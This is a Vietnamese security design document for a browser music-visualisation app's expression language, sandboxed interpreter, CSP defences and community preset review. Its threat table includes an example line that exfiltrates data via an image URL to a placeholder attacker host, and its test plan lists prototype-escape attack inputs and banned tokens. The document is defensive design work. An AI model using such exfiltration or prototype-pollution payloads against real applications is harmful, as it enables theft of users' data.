# Biểu thức người dùng, mô hình bảo mật và kiểm duyệt cộng đồng

> **[ĐÃ CHỐT ở tài liệu v1.1, 2026-11-12]** (D-39, D-41, D-43; yêu cầu SRS REQ-GRAPHICS-13, NFR-SEC-05…07). OI-16 đã chốt: **có** cho người dùng gõ biểu thức (giống expression trong After Effects) để điều khiển thuộc tính. Tài liệu này mô tả: (1) mã độc có thể làm gì với một ứng dụng web host trên GitHub Pages và chạy trên máy người dùng, (2) ngôn ngữ biểu thức và trình thông dịch an toàn (AD-13), (3) các lớp phòng thủ của ứng dụng (AD-14), (4) quy trình kiểm duyệt template và preset qua cộng đồng (AD-15). Liên quan: [CUSTOMIZATION.md](CUSTOMIZATION.md) (mô hình dữ liệu), [ANIMATION-CATALOG.md](ANIMATION-CATALOG.md), [COMMUNITY-CONTENT.md](../COMMUNITY-CONTENT.md), SRS NFR-SEC-01…04, BRD R-05. Task: T-29…T-31.

## 1. Nguyên tắc nền

1. **An toàn không được phụ thuộc vào người duyệt.** Người duyệt có thể sơ suất hoặc bị lừa. Thiết kế phải đảm bảo một preset **dù độc hại đến đâu cũng không làm hại được** máy người dùng. Kiểm duyệt cộng đồng chỉ để đảm bảo chất lượng, giấy phép và nội dung phù hợp, là lớp bảo vệ thêm chứ không phải lớp duy nhất.
2. **Preset là dữ liệu, không phải mã** (AD-08). Biểu thức cũng là dữ liệu: một chuỗi được phân tích bởi trình thông dịch của chính dự án, **không bao giờ** được chuyển thành JavaScript để chạy.
3. **Không có quyền nào để lạm dụng.** Ngôn ngữ biểu thức không có cách chạm vào mạng, DOM, bộ nhớ trình duyệt, tệp hay đồng hồ. Ngôn ngữ đó chỉ tính ra số.

## 2. "Mã độc" ở đây là gì

Ứng dụng chạy hoàn toàn trong trình duyệt (không backend). Trình duyệt đã cô lập trang web khỏi hệ điều hành, nên một preset độc **không thể** cài virus hay đọc ổ cứng một cách trực tiếp. Nhưng nếu preset chạy được JavaScript tuỳ ý trong trang, nó vẫn gây hại được theo những cách sau:

| # | Mối đe doạ | Ví dụ cụ thể | Chặn bằng |
|---|---|---|---|
| M1 | **Đánh cắp dữ liệu** | Đọc dự án nhạc, tài nguyên, preset riêng trong IndexedDB/localStorage rồi gửi ra ngoài qua `fetch`, `<img src="https://kẻ-xấu/?d=…">`, CSS `url()`, WebSocket | Biểu thức không truy cập được gì (§3); CSP `connect-src 'self'`, `img-src` không cho máy chủ ngoài (§5) |
| M2 | **Theo dõi** | Preset tham chiếu ảnh hoặc phông trên máy chủ ngoài, lộ IP và thời điểm mở | Preset không được chứa URL ngoài; tài nguyên nhúng theo băm (AD-12) |
| M3 | **Treo hoặc làm sập tab** | Vòng lặp vô hạn, đệ quy, cấp phát hàng GB, regex thảm hoạ | Ngôn ngữ không có vòng lặp, đệ quy, regex; ngân sách bước tính; chạy trong Worker có watchdog (§4, §5) |
| M4 | **Đào tiền ảo** | Dùng CPU/GPU của người xem để đào coin | Không chạy được mã tuỳ ý; ngân sách tính toán mỗi khung |
| M5 | **Lừa đảo giao diện** | Vẽ hộp thoại giả "đăng nhập GitHub" để lấy mật khẩu; liên kết lừa | Preset chỉ vẽ vào canvas khung hình, không tạo được DOM, form, liên kết; CSP `form-action 'none'` |
| M6 | **XSS qua dữ liệu** | Tên preset, mô tả, tên tác giả chứa `<script>` hoặc HTML | React escape mặc định; cấm `dangerouslySetInnerHTML`/`innerHTML` (NFR-SEC-02); Trusted Types |
| M7 | **SVG chứa script** | Tài nguyên `.svg` có `<script>`, `onload`, `<foreignObject>` | SVG chỉ vẽ qua `<img>`/`ImageBitmap` (script không chạy); CI cộng đồng từ chối SVG có các thẻ này |
| M8 | **Bom giải nén / bom ảnh** | Gói preset 10 KB bung ra 10 GB; PNG 1×1 khai báo 100.000×100.000 điểm ảnh | Giới hạn giải nén của parser-core (REQ-PARSER-00); kiểm kích thước ảnh trước khi giải mã |
| M9 | **Prototype pollution** | JSON có khoá `__proto__`, `constructor` làm hỏng đối tượng của ứng dụng | Kiểm schema, bỏ khoá cấm (đã làm cho schema nhị phân); dùng `Object.create(null)` hoặc `Map` |
| M10 | **Dùng chung origin trên GitHub Pages** | Trang `tên.github.io/repo-khác` cùng origin với `tên.github.io/dawviz`, nên **đọc được localStorage/IndexedDB** của ứng dụng | Host ở tên miền riêng hoặc tài khoản/tổ chức GitHub chỉ dùng cho dự án (OI-17, §5) |
| M11 | **Chuỗi cung ứng** | Gói npm bị chiếm quyền chèn mã vào bản build; PR sửa workflow để đánh cắp token | `npm ci` theo lockfile, ít phụ thuộc, Dependabot, ghim GitHub Actions theo SHA, quyền token tối thiểu, CODEOWNERS (§6) |
| M12 | **Tải tệp độc về máy** | Preset tự kích hoạt tải xuống một tệp `.exe` | Preset không có khả năng tải xuống; chỉ người dùng bấm "Xuất" mới tạo tệp, và chỉ là video hoặc preset |

**Kết luận:** chỉ cần **không bao giờ chạy mã của preset như JavaScript** (§3, §4) là đã chặn tận gốc M1, M3, M4, M5, M12. Các lớp còn lại (§5) phòng khi có lỗi ở đâu đó.

## 3. Ngôn ngữ biểu thức (AD-13)

### 3.1 Người dùng viết gì

Mỗi thuộc tính (vị trí, kích thước, màu, độ mờ…) có thể đặt bằng một biểu thức thay cho keyframe hoặc binding:

```text
// kích thước nốt: theo độ mạnh, thêm nhịp thở theo phách
0.5 + note.velocity / 127 * (1 + 0.3 * sin(beat.phase * TAU))

// màu: nốt cao màu hồng, nốt thấp màu xanh, chuyển dần ở giữa
mix(#4aa8f5, #ff6b9d, smoothstep(48, 72, note.pitch))

// vị trí x: theo pan của track, rung nhẹ khi nốt mạnh
let shake = wiggle(8, note.velocity / 20);
track.pan * 200 + shake

// độ mờ: tắt dần 0,5 giây sau khi nốt kết thúc
note.active ? 1 : ease(clamp(1 - note.sinceEnd / 0.5, 0, 1), "easeOutCubic")

// lặp keyframe sẵn có theo kiểu ping-pong
loop("pingpong")
```

### 3.2 Đặc tả

| Thành phần | Cho phép | Không cho phép |
|---|---|---|
| Kiểu giá trị | số, boolean, màu (`#rrggbb`, `rgb()`, `oklch()`), vec2 `[x, y]`, chuỗi **hằng** cho tên enum (`"easeOutCubic"`) | đối tượng, hàm làm giá trị, mảng tuỳ ý, chuỗi ghép động |
| Toán tử | `+ - * / % **`, so sánh, `&& \|\| !`, `? :` | gán vào biến ngoài, `++`, toán tử bit (không cần) |
| Biến | `let tên = …;` (tối đa 16), chỉ trong biểu thức | biến toàn cục, sửa biến hệ thống |
| Dữ liệu đọc được | danh sách trắng cố định: `t`, `time.*`, `beat.*`, `bar.*`, `note.*`, `track.*`, `layer.*`, `index`, `count`, `seed`, `value` (giá trị keyframe hiện tại), `width`, `height` | `window`, `this`, `globalThis`, `constructor`, `__proto__`, bất kỳ tên nào ngoài danh sách |
| Hàm | danh sách trắng thuần (§3.3) | khai báo hàm, gọi hàm theo tên động, gọi phương thức `a.b()` |
| Điều khiển | `? :` | `for`, `while`, đệ quy, `try`, `import` |

Dấu chấm (`note.velocity`) **không phải truy cập thuộc tính JavaScript**. Đó là một tên phẳng `"note.velocity"` được tra trong bảng biến cố định. Vì vậy những thứ như `note.constructor`, `beat.__proto__` hay `t["con"+"structor"]` đơn giản là **tên không tồn tại** và bị báo lỗi ngay lúc phân tích.

### 3.3 Hàm có sẵn

| Nhóm | Hàm |
|---|---|
| Toán | `abs, sign, floor, ceil, round, fract, min, max, clamp, mix/lerp, step, smoothstep, sqrt, pow, exp, log, sin, cos, tan, asin, acos, atan, atan2, mod, PI, TAU` |
| Ánh xạ | `map(v, a, b, c, d)`, `linear(v, a, b, c, d)`, `ease(x, "tên")`, `ease(v, a, b, c, d, "tên")` (giống `linear()` có easing) |
| Ngẫu nhiên tất định | `random()`, `random(a, b)` theo `seed` của phần tử; `noise(x)`, `noise(x, y)` |
| Thời gian | `wiggle(freq, amp)`, `oscillate(freq, amp, "sine\|triangle\|square\|saw")`, `loop("cycle\|pingpong\|offset")`, `valueAt(time)` (đọc keyframe của chính thuộc tính), `beatsToSec`, `secToBeats` |
| Màu | `rgb, hsl, oklch, mix, lighten, darken, saturate, alpha, hue` |
| Vector | `vec(x, y)`, `length, normalize, dot, rotate` |

Không có `Date`, `random` thật, I/O, hay bất kỳ thứ gì phụ thuộc máy (giữ AD-07). `valueAt` chỉ đọc **cùng thuộc tính**; không đọc chéo giữa các phần tử trong v1, để tránh vòng phụ thuộc. Nếu cần liên kết chéo, chỉ thêm khi có kiểm tra đồ thị phụ thuộc không có chu trình.

### 3.4 Giới hạn cứng

| Giới hạn | Giá trị đề xuất |
|---|---|
| Độ dài mã nguồn | 2.000 ký tự |
| Số nút cây cú pháp | 500 |
| Độ sâu lồng | 32 |
| Số `let` | 16 |
| Bước tính mỗi lần đánh giá | 10.000 |
| Tổng bước tính mỗi khung, toàn cảnh | 2.000.000 (vượt thì phần tử dùng giá trị dự phòng và báo cảnh báo) |

Kết quả `NaN` hoặc `Infinity` được thay bằng giá trị dự phòng (giá trị keyframe hoặc mặc định), và một cảnh báo được ghi theo phần tử. Khung hình không bao giờ bị hỏng.

## 4. Trình thông dịch an toàn

```text
chuỗi nguồn
  → Tokenizer (viết tay; chỉ nhận ký tự hợp lệ; từ chối Unicode lạ, ký tự điều khiển)
  → Parser Pratt (viết tay; dựng cây cú pháp; áp giới hạn §3.4)
  → Kiểm tra ngữ nghĩa (tên biến và hàm có trong danh sách trắng, đúng số và kiểu tham số)
  → "Biên dịch" thành cây closure TypeScript (KHÔNG sinh chuỗi JavaScript)
  → Đánh giá trong Worker vẽ, có bộ đếm bước
```

Quy tắc cài đặt (kiểm bằng test tĩnh và review):

1. **Cấm** `eval`, `new Function`, `Function.prototype.constructor`, `setTimeout(chuỗi)`, `with`, `import()` động, `Proxy` và `Reflect` trong mã trình thông dịch. Một test quét mã nguồn `packages/expr` tìm các từ này, giống test quét `Date`/`Math.random` của Render Core.
2. Bảng biến và bảng hàm là `Map` (hoặc `Object.create(null)`), **không** phải đối tượng thường, nên tra cứu không bao giờ chạm tới prototype.
3. Hàm có sẵn là hàm thuần, nhận số và trả số; mọi đối số được kiểm kiểu.
4. Không có đường nào từ biểu thức tới đối tượng JavaScript của ứng dụng: biểu thức chỉ nhận **bản chụp số** của dữ liệu (`note.velocity = 96`), không nhận chính đối tượng nốt.
5. Phân tích một lần khi nạp hoặc sửa; mỗi khung chỉ chạy cây closure, đủ nhanh cho hàng chục nghìn lần đánh giá.
6. Package mới `@dawviz/expr`: zero-dependency như parser (quy tắc 8 của AI_CONTEXT), dùng chung cho ứng dụng, Worker xuất và CI cộng đồng.

**Kiểm thử bắt buộc:**

* **Bộ tấn công mẫu:** `constructor`, `__proto__`, `prototype`, `this`, `globalThis`, `window`, `self`, `import`, chuỗi Unicode lẫn lộn (`ｃonstructor`), ký tự điều khiển, chuỗi siêu dài, lồng siêu sâu, `1/0`, số mũ khổng lồ. Mọi mẫu phải bị từ chối khi phân tích hoặc trả giá trị dự phòng.
* **Fuzz có seed:** sinh ngẫu nhiên hàng trăm nghìn biểu thức hợp lệ và không hợp lệ. Trình thông dịch không được ném lỗi ngoài `ExprError{code}`, không treo, không vượt ngân sách.
* **Tất định:** cùng biểu thức và cùng đầu vào cho cùng kết quả, ở Node và trình duyệt.
* **Đối chứng:** các biểu thức số học so với kết quả tính bằng tay.

## 5. Phòng thủ nhiều lớp cho ứng dụng (AD-14)

| Lớp | Việc làm | Chặn |
|---|---|---|
| CSP | Thêm thẻ `<meta http-equiv="Content-Security-Policy">` theo NFR-SEC-03 vào `apps/web/index.html` (hiện **chưa có**). Giữ `connect-src 'self'`, không `unsafe-eval`, `object-src 'none'`, `base-uri 'none'`, `form-action 'none'`. GitHub Pages không đặt được header nên dùng thẻ `meta` | M1, M2, M5, M6 |
| Trusted Types | `require-trusted-types-for 'script'` trong CSP: trình duyệt Chromium từ chối mọi gán `innerHTML` chưa qua chính sách | M6 |
| Origin riêng | **Đã chốt (D-41):** host ở tổ chức GitHub riêng cho dự án (`<tổ-chức>.github.io`); có thể trỏ tên miền riêng sau. Không host ở `tên-cá-nhân.github.io/dawviz` | M10 |
| Thư viện cộng đồng cùng origin | CI dựng site sẽ kéo bản đã duyệt của repo `dawviz-community` (theo tag) vào chính site, nên ứng dụng chỉ tải `index.json` từ `'self'`. Không cần mở `connect-src` ra ngoài, giữ NFR-SEC-01 | M1, M2 |
| Worker và watchdog | Đánh giá biểu thức và vẽ trong Worker. Nếu một khung quá 2 giây, luồng chính huỷ Worker, tắt biểu thức của phần tử gây lỗi và báo người dùng | M3, M4 |
| Kiểm khi nạp | Preset qua JSON Schema, bỏ khoá cấm, giới hạn kích thước; gói `.zip` qua giới hạn giải nén của parser-core; ảnh kiểm kích thước trước khi giải mã; SVG chỉ vẽ dạng ảnh | M6, M7, M8, M9 |
| Không URL ngoài | Lược đồ preset không có trường URL; tài nguyên tham chiếu bằng `asset:sha256-…` | M2 |
| Chuỗi cung ứng | `npm ci`; Dependabot; ghim Actions theo SHA; `permissions:` tối thiểu; không dùng `pull_request_target` cho PR từ fork; CODEOWNERS cho `.github/`, `scripts/`, `packages/expr/` | M11 |

## 6. Kiểm duyệt template và preset qua cộng đồng (AD-15)

### 6.1 Ba mức tin cậy hiển thị trong ứng dụng

| Mức | Nguồn | Hiển thị |
|---|---|---|
| **Dựng sẵn** | Đi kèm ứng dụng | Không nhãn |
| **Cộng đồng đã duyệt** | Từ `index.json` của repo cộng đồng, đúng băm | Nhãn "Đã duyệt" + tác giả + giấy phép + người duyệt |
| **Tự nạp** | Người dùng kéo tệp vào | Nhãn "Chưa kiểm duyệt" và ghi rõ nguồn. Vẫn an toàn nhờ §3–§5; nhãn chỉ báo chất lượng và giấy phép chưa được kiểm |

### 6.2 Luồng đóng góp

```text
Người dùng: "Chia sẻ thành preset" → gói .dawviz-preset.zip
   ↓ pull request (hoặc issue theo mẫu, người duy trì chuyển thành PR)
CI tự động (không có secret, quyền chỉ đọc):
   • JSON Schema, kích thước, tên tệp, giấy phép SPDX trong danh sách cho phép
   • Phân tích MỌI biểu thức bằng @dawviz/expr: hợp lệ, trong giới hạn §3.4
   • Đo ngân sách: dựng N khung bằng Render Core trong Node, phải dưới ngưỡng thời gian và bước tính
   • Tài nguyên: kiểm magic bytes, kích thước ảnh, SVG không có <script>, on*=, <foreignObject>, href ngoài
   • Không trùng băm với tài nguyên có sẵn; không có URL ngoài
   • Sinh ảnh/GIF xem trước gắn vào PR để người duyệt nhìn thấy kết quả thật
   ↓
Duyệt bởi kiểm duyệt viên cộng đồng (D-43): 2 phê duyệt từ đội reviewers (đội dưới 3 người: 1 reviewer + 1 maintainer); không tự duyệt
   • chất lượng, hoạt động đúng như mô tả, không phản cảm
   • giấy phép và nguồn tài nguyên hợp lệ
   • với người đóng góp lần đầu: GitHub yêu cầu người duy trì bấm cho chạy Actions
   ↓ merge vào main
CI phát hành: sinh index.json (băm SHA-256 từng tệp), gắn tag phiên bản
   ↓
CI của ứng dụng kéo tag đã duyệt vào site (cùng origin), ứng dụng kiểm băm khi cài
```

### 6.3 Sau khi phát hành

* **Bất biến:** mỗi phiên bản preset cố định theo băm. Sửa preset là tạo phiên bản mới và phải qua duyệt lại.
* **Báo cáo:** nút "Báo cáo preset" trong ứng dụng mở issue theo mẫu (không gửi dữ liệu tự động, giữ NFR-SEC-01).
* **Thu hồi:** `index.json` có danh sách `revoked` (băm và lý do). Ứng dụng ẩn preset bị thu hồi khỏi thư viện và báo cho người đã cài, nhưng không xoá dự án của họ.
* **Quy tắc ứng xử** và **danh sách kiểm cho người duyệt** đặt trong repo cộng đồng.

### 6.4 Kiểm duyệt viên cộng đồng (D-43)

| Việc | Quy tắc |
|---|---|
| Trở thành reviewer | Có ít nhất 3 đóng góp đã được merge, được một reviewer hoặc maintainer đề cử trong issue công khai, maintainer chấp thuận; được thêm vào đội `reviewers` của tổ chức GitHub và nhận nhãn "Kiểm duyệt viên" |
| Quyền | Phê duyệt PR preset, tài nguyên, bản dịch. **Không** duyệt thay đổi CI, workflow, schema, `@dawviz/expr` (chỉ maintainer, CODEOWNERS) |
| Số phê duyệt | 2 reviewer; khi đội dưới 3 người: 1 reviewer + 1 maintainer. Không ai tự duyệt PR của mình (GitHub chặn sẵn) |
| Lĩnh vực | Có thể gán nhãn chuyên môn (preset, bản dịch theo ngôn ngữ, tài nguyên) để PR được giao đúng người |
| Thu hồi | Không hoạt động 6 tháng thì chuyển sang danh dự; duyệt sai nghiêm trọng hoặc vi phạm quy tắc ứng xử thì maintainer thu hồi quyền ngay |
| Minh bạch | Mọi phê duyệt nằm công khai trên PR; ứng dụng hiện tên người duyệt cạnh preset |
| Xác nhận quyền đóng góp | Mọi commit có `Signed-off-by` (DCO, D-42); CI kiểm |

## 7. Yêu cầu tương ứng (đã đưa vào SRS v1.1)

| ID dự kiến | Nội dung |
|---|---|
| REQ-GRAPHICS-13 | Biểu thức thuộc tính theo §3; trình soạn có tô màu cú pháp, gợi ý tên, báo lỗi theo vị trí; nút "Bake thành keyframe" |
| NFR-SEC-05 | Trình thông dịch biểu thức: không sinh mã JS, danh sách trắng, giới hạn §3.4, bộ test tấn công và fuzz |
| NFR-SEC-06 | CSP và Trusted Types trong `index.html`; host ở origin riêng (OI-17) |
| NFR-SEC-07 | Ba mức tin cậy preset, kiểm băm, danh sách thu hồi |

## 8. Ước lượng

| Phần | Ngày làm việc |
|---|---|
| `@dawviz/expr`: tokenizer, parser, kiểm ngữ nghĩa, closure, giới hạn, hàm có sẵn | 4–6 |
| Bộ test tấn công, fuzz, tất định | 2–3 |
| Trình soạn biểu thức trong ứng dụng (tô màu, gợi ý, lỗi, bake) | 3–5 |
| CSP, Trusted Types, watchdog Worker, kiểm khi nạp (T-30) | 2–4 |
| CI kiểm duyệt cộng đồng, mẫu PR/issue, sinh ảnh xem trước, thu hồi (T-31) | 4–6 |
| **Tổng** | **15–24 ngày ≈ 3–5 tuần** |

## 9. Vấn đề mở

* **OI-16 (đã đóng):** biểu thức có từ 1.0; morph SVG tự do ở 1.2 (D-44).
* **OI-17 (đã đóng, D-41):** host bằng tổ chức GitHub riêng (`<tổ-chức>.github.io`), có thể trỏ tên miền riêng sau.
